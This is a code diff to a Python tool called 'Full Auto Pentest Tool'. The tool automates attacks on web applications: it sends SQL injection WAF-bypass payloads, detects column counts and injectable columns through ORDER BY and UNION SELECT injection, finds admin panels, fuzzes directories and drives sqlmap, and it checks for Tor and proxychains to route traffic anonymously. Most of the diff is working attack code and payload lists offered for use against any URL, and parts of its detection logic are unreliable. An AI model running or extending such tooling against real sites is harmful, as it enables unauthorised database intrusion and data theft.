@@ -2,7 +2,7 @@
 # ================================================================
 # Full Auto Pentest Tool - Complete Working Version
 # Author: Hydra Strozzz
-# Version: 3.0
+# Version: 3.0 (Enhanced with fixes)
 # ================================================================
 
 import os
@@ -267,13 +267,60 @@ def extract_domain(url):
     parsed = urllib.parse.urlparse(url)
     return parsed.netloc or parsed.path.split("/")[0]
 
+# --- Helper to detect fake 200 pages that are actually errors ---
+def is_fake_200(body, status):
+    """Return True if the body indicates a 404/error despite status 200."""
+    if status != 200:
+        return False
+    body_lower = body.lower()
+    # Common error indicators
+    error_patterns = [
+        "404 not found", "page not found", "not found", "the requested url was not found",
+        "does not exist", "no page found", "error 404", "404 error", "404 - not found",
+        "404 not found", "404 page", "page could not be found", "we couldn't find that",
+        "sorry, that page doesn't exist", "404", "not found on this server",
+        "the requested page does not exist", "file not found"
+    ]
+    for p in error_patterns:
+        if p in body_lower:
+            return True
+    # Check for typical 404 title
+    if "<title>404" in body or "<title>Not Found" in body or "<title>Error 404" in body:
+        return True
+    # Check for very short responses (common for 404 pages)
+    if len(body) < 100 and ("404" in body or "not found" in body_lower):
+        return True
+    return False
+
+def get_response(url, timeout=10):
+    """Return (status, headers, body) with fake-200 detection."""
+    try:
+        req = urllib.request.Request(url, headers={"User-Agent": get_random_ua()})
+        resp = urllib.request.urlopen(req, timeout=timeout)
+        status = resp.getcode()
+        headers = dict(resp.headers)
+        body = resp.read().decode('utf-8', errors='ignore')
+        if status == 200 and is_fake_200(body, status):
+            # Treat as 404
+            return 404, headers, body
+        return status, headers, body
+    except urllib.error.HTTPError as e:
+        status = e.code
+        try:
+            body = e.read().decode('utf-8', errors='ignore')
+        except:
+            body = ""
+        headers = dict(e.headers) if hasattr(e, 'headers') else {}
+        return status, headers, body
+    except Exception:
+        return None, None, None
+
 TOR_RUNNING = False
 PROXYCHAINS_AVAILABLE = False
 
 def check_tor_status():
     global TOR_RUNNING
     try:
-        import socket
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.settimeout(2)
         result = sock.connect_ex(('127.0.0.1', 9050))
@@ -304,7 +351,8 @@ def get_proxychains_cmd():
 
 def show_banner():
     os.system('clear' if os.name == 'posix' else 'cls')
-    print(f"{RED}")
+    # Changed to GREEN
+    print(f"{GREEN}")
     banner_lines = [
         "______ _      _          _____                  ",
         "|  _  \(_)    | |        /  ___|                 ",
@@ -316,7 +364,7 @@ def show_banner():
         "                   |___/                         "
     ]
     for line in banner_lines:
-        print(f"{RED}{line}{NC}")
+        print(f"{GREEN}{line}{NC}")
     print(f"{YELLOW}  [+] Author : {AUTHOR}{NC}")
     print(f"{YELLOW}  [+] Version: {VERSION}{NC}")
     print(f"{YELLOW}  [+] Mode   : Full Auto Pentest{NC}")
@@ -402,10 +450,11 @@ WAF_BYPASS_PAYLOADS_SQLI = [
 ]
 
 # ============================================================
-# WAF BYPASS TECHNIQUES
+# EXPANDED WAF BYPASS TECHNIQUES (SQL) - added many more
 # ============================================================
 
 WAF_BYPASS_TECHNIQUES_SQL = [
+    # Original set
     {"name": "Comment Injection", "payload": "'/**/OR/**/'1'='1"},
     {"name": "Comment UNION", "payload": "'/**/UNION/**/SELECT/**/1,2,3-- -"},
     {"name": "Case Variation", "payload": "'/**/UnIoN/**/SeLeCt/**/1,2,3-- -"},
@@ -435,6 +484,35 @@ WAF_BYPASS_TECHNIQUES_SQL = [
     {"name": "True Constant", "payload": "' OR true-- -"},
     {"name": "Versioned Comment", "payload": "'/*!OR*/'1'='1"},
     {"name": "Optimizer Hint", "payload": "' /**/+ '1'='1"},
+    # NEW: additional advanced bypasses
+    {"name": "Multi-Comment", "payload": "'/**/OR/**/1=1/**/-- -"},
+    {"name": "Mixed Case", "payload": "' oR 1=1-- -"},
+    {"name": "Double Comment", "payload": "'/*!50000OR*/1=1-- -"},
+    {"name": "Encoded NULL", "payload": "'%20%4f%52%20%27%31%27%3d%27%31"},
+    {"name": "MySQL XOR", "payload": "' ^ 0=0-- -"},
+    {"name": "PostgreSQL Double Pipe", "payload": "' || '1'='1"},
+    {"name": "MS SQL Comment", "payload": "'/**/OR/**/'1'='1"},
+    {"name": "Oracle Identifier", "payload": "' OR '1'='1'--"},
+    {"name": "Tab Separation", "payload": "'\tOR\t'1'='1"},
+    {"name": "Line Feed", "payload": "'\nOR\n'1'='1"},
+    {"name": "Carriage Return", "payload": "'\rOR\r'1'='1"},
+    {"name": "Parameter Pollution with Encoding", "payload": "id=1%00' OR '1'='1"},
+    {"name": "JSON Obfuscation", "payload": '{"id":"1\' OR \'1\'=\'1"}'},
+    {"name": "XML Encoded", "payload": "&#39; OR &#39;1&#39;=&#39;1"},
+    {"name": "Umlaut Bypass", "payload": "’ OR ’1’=’1"},
+    {"name": "Quote Escape", "payload": "\\' OR '1'='1"},
+    {"name": "No Space", "payload": "'OR'1'='1"},
+    {"name": "Multiline", "payload": "'\nOR\n'1'='1'--"},
+    {"name": "Case Shift with Functions", "payload": "' uNIoN sElEcT 1,2,3-- -"},
+    {"name": "Hex Function", "payload": "' OR unhex('313d31')-- -"},
+    {"name": "Concat Bypass", "payload": "' OR CONCAT('1','=','1')-- -"},
+    {"name": "If Condition", "payload": "' OR IF(1=1,1,0)-- -"},
+    {"name": "Case When", "payload": "' OR CASE WHEN 1=1 THEN 1 ELSE 0 END-- -"},
+    {"name": "Decimal Encoding", "payload": "' OR 1=1.0-- -"},
+    {"name": "Exponent", "payload": "' OR 1=1e0-- -"},
+    {"name": "Bitwise", "payload": "' OR 1|0=1-- -"},
+    {"name": "Not Equal", "payload": "' OR 1<>0-- -"},
+    {"name": "Less/Greater", "payload": "' OR 1>0-- -"},
 ]
 
 # ============================================================
@@ -491,7 +569,7 @@ def detect_waf(url):
         return None
 
 # ============================================================
-# AUTO WAF BYPASS
+# AUTO WAF BYPASS (ENHANCED - shows technique names)
 # ============================================================
 
 def auto_waf_bypass(url):
@@ -545,10 +623,11 @@ def auto_waf_bypass(url):
                 continue
         if successful_bypass:
             break
-    # Phase 2: Payload-based bypass
+    # Phase 2: Payload-based bypass with technique name printing
     if not successful_bypass:
         print_info("Phase 2: Payload-based bypass techniques...")
         for technique in WAF_BYPASS_TECHNIQUES_SQL:
+            print_info(f"  Trying technique: {technique['name']}")
             for param in params:
                 key = param.split("=")[0] if "=" in param else param
                 if technique["name"] == "HPP":
@@ -606,7 +685,7 @@ def auto_waf_bypass(url):
     return successful_bypass, bypass_method
 
 # ============================================================
-# FIXED COLUMN DETECTION
+# FIXED COLUMN DETECTION (descending from 100)
 # ============================================================
 
 def detect_columns_fixed(url):
@@ -616,7 +695,7 @@ def detect_columns_fixed(url):
         return None, []
     base_url = url.split("?")[0]
     params_part = url.split("?")[1] if "?" in url else ""
-    print_info("Detecting number of columns using ORDER BY and UNION techniques...")
+    print_info("Detecting number of columns using ORDER BY and UNION techniques (descending from 100)...")
     max_columns = 0
     vulnerable_params = []
     param_pairs = []
@@ -629,24 +708,27 @@ def detect_columns_fixed(url):
         param_pairs.append(key)
     for param in param_pairs:
         print_info(f"Testing parameter: {param}")
-        for cols in range(1, 31):
+        # Try from 100 down to 1
+        for cols in range(100, 0, -1):
             test_url = f"{base_url}?{param}=1' ORDER BY {cols}-- -"
             try:
                 req = urllib.request.Request(test_url, headers={"User-Agent": get_random_ua()})
                 resp = urllib.request.urlopen(req, timeout=10)
                 body = resp.read().decode('utf-8', errors='ignore')
+                # If no error, that means ORDER BY {cols} is valid, so max_columns >= cols
                 if "Unknown column" not in body and "order by" not in body.lower()[:200]:
                     max_columns = cols
-                else:
-                    if cols > 1:
-                        max_columns = cols - 1
+                    # We found the maximum (since descending), break
                     break
+                else:
+                    # If error, then cols is too high, continue descending
+                    continue
             except urllib.error.HTTPError as e:
                 if e.code in [500, 404]:
-                    if cols > 1:
-                        max_columns = cols - 1
-                    break
+                    # Often error means invalid column, so continue
+                    continue
                 elif e.code in [403, 406, 503]:
+                    # WAF blocking, try bypass headers
                     bypass_worked = False
                     for bh in random.sample(WAF_BYPASS_HEADERS, 5):
                         h = {"User-Agent": get_random_ua()}
@@ -660,30 +742,27 @@ def detect_columns_fixed(url):
                                 bypass_worked = True
                                 break
                             else:
-                                if cols > 1:
-                                    max_columns = cols - 1
-                                bypass_worked = True
-                                break
+                                continue
                         except:
                             continue
                     if not bypass_worked:
-                        break
+                        continue
                 else:
-                    if cols > 1:
-                        max_columns = cols - 1
-                    break
+                    # Other errors, assume column invalid
+                    continue
             except:
-                if cols > 1:
-                    max_columns = cols - 1
-                break
+                continue
             time.sleep(0.3)
         if max_columns > 0:
             vulnerable_params.append(param)
             print_good(f"Parameter '{param}' has {max_columns} columns (ORDER BY)")
+        else:
+            print_warn(f"Could not detect column count for parameter '{param}'")
+    # If no parameter gave columns, try UNION SELECT NULL technique (descending)
     if max_columns == 0:
-        print_info("ORDER BY failed. Trying UNION SELECT NULL technique...")
+        print_info("ORDER BY failed. Trying UNION SELECT NULL technique (descending from 50)...")
         for param in param_pairs:
-            for cols in range(1, 21):
+            for cols in range(50, 0, -1):
                 nulls = ",".join(["NULL"] * cols)
                 test_url = f"{base_url}?{param}=1' UNION SELECT {nulls}-- -"
                 try:
@@ -696,6 +775,7 @@ def detect_columns_fixed(url):
                         print_good(f"Parameter '{param}' has {max_columns} columns (UNION technique)")
                         break
                 except urllib.error.HTTPError:
+                    # Sometimes error indicates valid? We'll consider it positive if not a known error
                     max_columns = cols
                     vulnerable_params.append(param)
                     print_good(f"Parameter '{param}' has {max_columns} columns (UNION - error based)")
@@ -709,6 +789,59 @@ def detect_columns_fixed(url):
         return None, []
     print_good(f"Maximum columns detected: {max_columns}")
     return max_columns, vulnerable_params
+
+# ============================================================
+# VULNERABLE COLUMN FINDER (Improved)
+# ============================================================
+
+def find_vulnerable_columns(url, num_columns, params):
+    print_section(" Vulnerable Column Detection ")
+    if not num_columns or num_columns == 0:
+        print_warn("No column count available")
+        return None
+    base_url = url.split("?")[0]
+    vulnerable_cols = []
+    print_info(f"Testing {num_columns} columns for string injection points...")
+    for col_num in range(1, num_columns + 1):
+        cols = []
+        for i in range(1, num_columns + 1):
+            if i == col_num:
+                cols.append("'test'")
+            else:
+                cols.append("NULL")
+        nulls = ",".join(cols)
+        for param in params:
+            test_url = f"{base_url}?{param}=1' UNION SELECT {nulls}-- -"
+            try:
+                req = urllib.request.Request(test_url, headers={"User-Agent": get_random_ua()})
+                resp = urllib.request.urlopen(req, timeout=10)
+                body = resp.read().decode('utf-8', errors='ignore')
+                if "test" in body:
+                    vulnerable_cols.append(col_num)
+                    print_good(f"Column {col_num} is injectable (string)")
+                    break
+            except urllib.error.HTTPError as e:
+                if e.code == 200:
+                    try:
+                        body = e.read().decode('utf-8', errors='ignore')
+                        if "test" in body:
+                            vulnerable_cols.append(col_num)
+                            print_good(f"Column {col_num} is injectable (string)")
+                            break
+                    except:
+                        pass
+                elif e.code not in [403, 406, 429]:
+                    # Assume it might be injectable (or we can't test properly)
+                    vulnerable_cols.append(col_num)
+                    print_good(f"Column {col_num} may be injectable (HTTP {e.code})")
+                    break
+            except:
+                continue
+    if vulnerable_cols:
+        print_good(f"Vulnerable columns: {vulnerable_cols}")
+    else:
+        print_warn("No vulnerable columns found")
+    return vulnerable_cols if vulnerable_cols else None
 
 # ============================================================
 # FIXED XSS DETECTION
@@ -854,58 +987,6 @@ def sql_injection_scan(url):
     return vulnerable
 
 # ============================================================
-# VULNERABLE COLUMN FINDER
-# ============================================================
-
-def find_vulnerable_columns(url, num_columns, params):
-    print_section(" Vulnerable Column Detection ")
-    if not num_columns or num_columns == 0:
-        print_warn("No column count available")
-        return None
-    base_url = url.split("?")[0]
-    vulnerable_cols = []
-    print_info(f"Testing {num_columns} columns for injection points...")
-    for col_num in range(1, num_columns + 1):
-        cols = []
-        for i in range(1, num_columns + 1):
-            if i == col_num:
-                cols.append("'test'")
-            else:
-                cols.append("NULL")
-        nulls = ",".join(cols)
-        for param in params:
-            test_url = f"{base_url}?{param}=1' UNION SELECT {nulls}-- -"
-            try:
-                req = urllib.request.Request(test_url, headers={"User-Agent": get_random_ua()})
-                resp = urllib.request.urlopen(req, timeout=10)
-                body = resp.read().decode('utf-8', errors='ignore')
-                if "test" in body:
-                    vulnerable_cols.append(col_num)
-                    print_good(f"Column {col_num} is injectable (string)")
-                    break
-            except urllib.error.HTTPError as e:
-                if e.code == 200:
-                    try:
-                        body = e.read().decode('utf-8', errors='ignore')
-                        if "test" in body:
-                            vulnerable_cols.append(col_num)
-                            print_good(f"Column {col_num} is injectable (string)")
-                            break
-                    except:
-                        pass
-                elif e.code not in [403, 406, 429]:
-                    vulnerable_cols.append(col_num)
-                    print_good(f"Column {col_num} may be injectable (HTTP {e.code})")
-                    break
-            except:
-                continue
-    if vulnerable_cols:
-        print_good(f"Vulnerable columns: {vulnerable_cols}")
-    else:
-        print_warn("No vulnerable columns found")
-    return vulnerable_cols if vulnerable_cols else None
-
-# ============================================================
 # AUTO SQLI SCAN (Error + Time + Boolean)
 # ============================================================
 
@@ -970,7 +1051,7 @@ def auto_sqli_scan(url):
                     break
             except:
                 continue
-    # Phase 4: Column detection
+    # Phase 4: Column detection (descending)
     max_cols, vuln_params = detect_columns_fixed(url)
     vuln_cols = None
     if max_cols and vuln_params:
@@ -1223,7 +1304,7 @@ def auto_nikto_scan(url):
         return False
 
 # ============================================================
-# ADMIN PANEL FINDER
+# ADMIN PANEL FINDER (using get_response)
 # ============================================================
 
 def find_admin_panel(url):
@@ -1237,34 +1318,29 @@ def find_admin_panel(url):
     print_info(f"Searching {len(ADMIN_PATHS)} admin paths...")
     for path in ADMIN_PATHS:
         test_url = domain_base + path
-        try:
-            req = urllib.request.Request(test_url, headers={"User-Agent": get_random_ua()})
-            resp = urllib.request.urlopen(req, timeout=6)
-            if resp.getcode() in [200, 301, 302, 401, 403]:
-                body = resp.read().decode('utf-8', errors='ignore')[:500]
-                if resp.getcode() == 200:
-                    if "login" in body.lower() or "password" in body.lower() or "username" in body.lower():
-                        admin_found.append((test_url, "Login Page"))
-                        print_good(f"Admin login found: {test_url}")
-                    elif "dashboard" in body.lower() or "admin" in body.lower():
-                        admin_found.append((test_url, "Dashboard"))
-                        print_good(f"Admin dashboard: {test_url}")
-                    else:
-                        admin_found.append((test_url, f"Accessible (HTTP {resp.getcode()})"))
-                        print_good(f"Admin path: {test_url} (HTTP {resp.getcode()})")
-                elif resp.getcode() in [301, 302]:
-                    admin_found.append((test_url, "Redirect"))
-                    print_good(f"Admin redirect: {test_url}")
-                elif resp.getcode() == 401:
-                    admin_found.append((test_url, "Auth Required"))
-                    print_warn(f"Admin requires auth: {test_url}")
-                elif resp.getcode() == 403:
-                    admin_found.append((test_url, "Forbidden"))
-                    print_warn(f"Admin forbidden: {test_url}")
-        except urllib.error.HTTPError as e:
-            if e.code in [401, 403]:
-                admin_found.append((test_url, f"HTTP {e.code}"))
-        except:
+        status, headers, body = get_response(test_url, timeout=6)
+        if status in [200, 301, 302, 401, 403]:
+            if status == 200:
+                if "login" in body.lower() or "password" in body.lower() or "username" in body.lower():
+                    admin_found.append((test_url, "Login Page"))
+                    print_good(f"Admin login found: {test_url}")
+                elif "dashboard" in body.lower() or "admin" in body.lower():
+                    admin_found.append((test_url, "Dashboard"))
+                    print_good(f"Admin dashboard: {test_url}")
+                else:
+                    admin_found.append((test_url, f"Accessible (HTTP {status})"))
+                    print_good(f"Admin path: {test_url} (HTTP {status})")
+            elif status in [301, 302]:
+                admin_found.append((test_url, "Redirect"))
+                print_good(f"Admin redirect: {test_url}")
+            elif status == 401:
+                admin_found.append((test_url, "Auth Required"))
+                print_warn(f"Admin requires auth: {test_url}")
+            elif status == 403:
+                admin_found.append((test_url, "Forbidden"))
+                print_warn(f"Admin forbidden: {test_url}")
+        elif status == 404:
+            # ignore
             continue
     if admin_found:
         print_section(" Admin Panel Results ")
@@ -1388,7 +1464,7 @@ def web_crawl(url, max_pages=50):
     return found_urls
 
 # ============================================================
-# DIRECTORY FUZZING
+# DIRECTORY FUZZING (using get_response)
 # ============================================================
 
 def fuzz_directories(url):
@@ -1399,14 +1475,10 @@ def fuzz_directories(url):
     found = []
     for path in FUZZ_WORDLIST:
         test_url = f"{base}/{path}"
-        try:
-            req = urllib.request.Request(test_url, headers={"User-Agent": get_random_ua()})
-            resp = urllib.request.urlopen(req, timeout=5)
-            if resp.getcode() in [200, 301, 302, 403]:
-                found.append((test_url, resp.getcode()))
-                print_good(f"Found: {test_url} (HTTP {resp.getcode()})")
-        except:
-            continue
+        status, headers, body = get_response(test_url, timeout=5)
+        if status in [200, 301, 302, 403]:
+            found.append((test_url, status))
+            print_good(f"Found: {test_url} (HTTP {status})")
     print_good(f"Found {len(found)} directories")
     return found
 
@@ -1603,7 +1675,6 @@ def run_auto_scan(url):
         if choice == "1":
             auto_sqlmap_with_bypass(url)
         elif choice == "2":
-            # Run standard sqlmap
             auto_sqlmap_with_bypass(url)
     print_section(" Nikto Integration ")
     print(f"{YELLOW}Run nikto web scanner?{NC}")
